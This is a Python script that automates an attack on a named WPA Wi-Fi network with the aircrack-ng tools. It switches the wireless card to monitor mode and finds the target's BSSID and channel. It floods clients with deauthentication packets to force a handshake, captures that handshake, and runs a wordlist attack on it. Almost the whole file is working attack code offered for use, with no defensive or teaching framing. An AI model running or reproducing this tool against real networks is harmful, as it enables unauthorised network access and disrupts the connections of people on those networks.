from threading import Thread
import threading
import time
import subprocess
import os
import math
import re
import time
import sys
import glob

# bssid = str()
# channel = str()
# result = str()
# def getBssidCH(bs):
# 	print("thread 1")
# 	time.sleep(1.5)
# 	print(bs)
name = input("Input name wifi: ")
print("Target:", name)
time.sleep(1.5)
def setup_device():
    global bssid
    global channel
    global result
    bssid = str()
    channel = str()
    result = str()
    try:
        # output = open("file.txt", "w")
        put_device_down = subprocess.call(["ifconfig", "wlan0mon", "down"])
        put_device_mon = subprocess.call(["iwconfig", "wlan0mon", "mode", "monitor"]) 
        put_device_up = subprocess.call(["iwconfig", "wlan0mon", "up"])
        start_device = subprocess.call(["airmon-ng", "start", "wlan0"])
        proc = subprocess.Popen(["airodump-ng", "wlan0mon"], stdout=subprocess.PIPE)
        # time.sleep(3)
        for line in proc.stdout:
            line = str(line)
            # print(line)
            # line = list(line)
            # if any(i == 'MVS GUEST 01' for i in line):
            if line.find(name) == -1:
                continue
            else:
                # print(line)
                result = line
                break
            time.sleep(0.2)
            # print(type(line))
        # time.sleep(5)
        proc.terminate()
        # x = re.split("\s", result)
        l = result.split()
        for _ in range(len(l)-1):
            bssid = l[1]
            channel = l[6]
        print('bssid:',bssid)
        print('channel:',channel)
        # time.sleep(5)
        # exportFile(bssid)
        # complite()
    except:
         print("Error0")
# exportFile(bssid)
def getBssidCH(bs, ch):
    try:
        print('------------------------------')
        os.system('airodump-ng --bssid {bssid} -c {channel} --write WPAcrack --output-format cap wlan0mon'.format(bssid = bs, channel = ch))
    except:
        print("Error1")
        
def getDump(bs):
    time.sleep(5)#checking
    try:
        os.system('aireplay-ng --deauth 100 -a {bssid} wlan0mon'.format(bssid = bs))
    except:
        print("Error2")


setup_device()
time.sleep(1)
t1 = threading.Thread(target=getBssidCH, args=(bssid, channel,))
t2 = threading.Thread(target=getDump, args=(bssid,))
# print(bssid)
# print(channel)
t1.start()
t2.start()
time.sleep(65)
os.system('airmon-ng stop wlan0mon')
l = glob.glob("*.cap")
fl = max(l)
os.system('aircrack-ng {file} -w /home/van/Desktop/test.txt'.format(file=fl))
print('crack over')
